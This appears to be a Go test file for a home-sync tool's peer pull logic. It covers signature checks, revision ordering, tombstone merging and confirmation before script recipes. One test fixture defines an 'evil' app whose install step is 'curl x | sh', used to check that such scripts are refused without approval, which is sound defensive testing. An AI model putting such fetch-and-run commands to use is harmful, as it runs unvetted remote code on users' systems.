package lan

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/rchehd/rehome/internal/config"
	"github.com/rchehd/rehome/internal/node"
)

// pullFrom pulls the fixture into a fresh root whose settings pin the given node keys.
func pullFrom(t *testing.T, f *fixture, root string, pinned map[string]*Identity, confirm func(config.App) bool) PullReport {
	t.Helper()
	var s config.Settings

	for id, ident := range pinned {
		s.Pin(config.Peer{ID: id, Name: id, Key: EncodeKey(ident.Public())})
	}

	rep, err := Pull(context.Background(), PullOptions{Root: root, OwnID: "self", Client: f.client(), Found: []Found{{Addr: f.addr}}, Settings: s, ConfirmScript: confirm})

	if err != nil {
		t.Fatal(err)
	}

	return rep
}

func TestPullRelaysThirdNodeThroughPeer(t *testing.T) {
	f := newFixture(t)
	root := t.TempDir()
	rep := pullFrom(t, f, root, map[string]*Identity{"a": f.owner}, nil)

	if len(rep.Updated) != 1 || rep.Updated[0] != "a" {
		t.Fatalf("report %+v", rep)
	}

	if _, err := VerifyFolder(filepath.Join(root, node.Dir, "a"), f.owner.Public()); err != nil {
		t.Fatalf("pulled node does not verify: %v", err)
	}
}

func TestPullTakesNewerSignedNode(t *testing.T) {
	f := newFixture(t)
	root := t.TempDir()
	signedNode(t, root, f.owner, "a", 1)
	rep := pullFrom(t, f, root, map[string]*Identity{"a": f.owner}, nil)

	if n, err := node.Load(filepath.Join(root, node.Dir, "a")); err != nil || n.Revision != 2 || len(rep.Updated) != 1 {
		t.Fatalf("did not take revision 2: %+v %v", rep, err)
	}
}

func TestPullIgnoresSameOrLowerRevision(t *testing.T) {
	f := newFixture(t)
	root := t.TempDir()
	signedNode(t, root, f.owner, "a", 5)
	rep := pullFrom(t, f, root, map[string]*Identity{"a": f.owner}, nil)

	if n, _ := node.Load(filepath.Join(root, node.Dir, "a")); n.Revision != 5 || len(rep.Updated) != 0 {
		t.Fatalf("replaced a newer local copy: %+v", rep)
	}
}

func TestPullNeverWritesOwnNode(t *testing.T) {
	f := newFixture(t)
	root := t.TempDir()
	var s config.Settings
	s.Pin(config.Peer{ID: "a", Name: "a", Key: EncodeKey(f.owner.Public())})
	rep, err := Pull(context.Background(), PullOptions{Root: root, OwnID: "a", Client: f.client(), Found: []Found{{Addr: f.addr}}, Settings: s})

	if err != nil || len(rep.Updated) != 0 {
		t.Fatalf("own node pulled: %+v %v", rep, err)
	}

	if _, err := os.Stat(filepath.Join(root, node.Dir, "a")); err == nil {
		t.Fatal("own node folder written")
	}
}

func TestPullSkipsNodesNotPairedDirectly(t *testing.T) {
	f := newFixture(t)
	rep := pullFrom(t, f, t.TempDir(), nil, nil)

	if rep.Skipped["a"] != "not paired directly" || len(rep.Updated) != 0 {
		t.Fatalf("report %+v", rep)
	}
}

func TestPullRejectsBadSignature(t *testing.T) {
	f := newFixture(t)
	root := t.TempDir()
	rep := pullFrom(t, f, root, map[string]*Identity{"a": testIdentity(t)}, nil)

	if rep.Skipped["a"] == "" || len(rep.Updated) != 0 {
		t.Fatalf("accepted a node signed by another key: %+v", rep)
	}
}

func TestPullAsksBeforeScriptRecipes(t *testing.T) {
	f := newFixture(t)
	recipes := "version: 2\napps:\n  - id: tree\n    install: {debian: {apt: tree}}\n  - id: evil\n    install: {debian: {script: curl x | sh, bin: ~/.evil}}\n"

	if err := os.WriteFile(config.FilePath(f.root), []byte(recipes), 0o644); err != nil {
		t.Fatal(err)
	}

	root := t.TempDir()
	var asked []string
	rep := pullFrom(t, f, root, nil, func(app config.App) bool { asked = append(asked, app.ID); return false })
	data, err := os.ReadFile(config.FilePath(root))

	if err != nil {
		t.Fatal(err)
	}

	if !strings.Contains(string(data), "tree") || strings.Contains(string(data), "evil") {
		t.Fatalf("merged recipes:\n%s", data)
	}

	if len(asked) != 1 || asked[0] != "evil" || len(rep.ScriptsSkipped) != 1 {
		t.Fatalf("asked %v, report %+v", asked, rep)
	}
}

func TestPullMergesTombstonesNewestWins(t *testing.T) {
	f := newFixture(t)
	peer := "version: 2\napps: []\nremoved:\n  - {id: x, by: a, at: 2026-01-02T00:00:00Z}\n  - {id: y, by: a, at: 2026-01-01T00:00:00Z}\n"

	if err := os.WriteFile(config.FilePath(f.root), []byte(peer), 0o644); err != nil {
		t.Fatal(err)
	}

	root := t.TempDir()
	local := "version: 2\napps: []\nremoved:\n  - {id: x, by: b, at: 2026-01-01T00:00:00Z}\n  - {id: y, by: b, at: 2026-01-05T00:00:00Z}\n"

	if err := os.WriteFile(config.FilePath(root), []byte(local), 0o644); err != nil {
		t.Fatal(err)
	}

	pullFrom(t, f, root, nil, nil)
	data, err := os.ReadFile(config.FilePath(root))

	if err != nil {
		t.Fatal(err)
	}

	cfg, err := config.Parse(data)

	if err != nil {
		t.Fatal(err)
	}

	x, _ := cfg.Tombstone("x")
	y, _ := cfg.Tombstone("y")

	if !x.At.Equal(time.Date(2026, 1, 2, 0, 0, 0, 0, time.UTC)) || y.By != "b" {
		t.Fatalf("tombstones x=%+v y=%+v", x, y)
	}
}
